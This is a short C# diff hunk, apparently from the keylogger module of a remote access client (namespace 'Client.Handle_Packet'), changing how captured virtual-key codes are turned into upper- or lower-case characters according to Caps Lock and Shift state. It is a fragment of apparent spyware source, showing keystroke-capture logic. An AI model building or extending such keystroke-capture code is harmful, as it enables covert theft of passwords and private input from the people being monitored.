@@ -62,11 +62,11 @@ namespace Client.Handle_Packet
 
                     if (capsLock || shiftPress)
                     {
-                        currentKey = KeyboardLayout((uint)vkCode).ToUpper();
+                        currentKey = currentKey.ToUpper();
                     }
                     else
                     {
-                        currentKey = KeyboardLayout((uint)vkCode).ToLower();
+                        currentKey = currentKey.ToLower();
                     }
 
                     if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
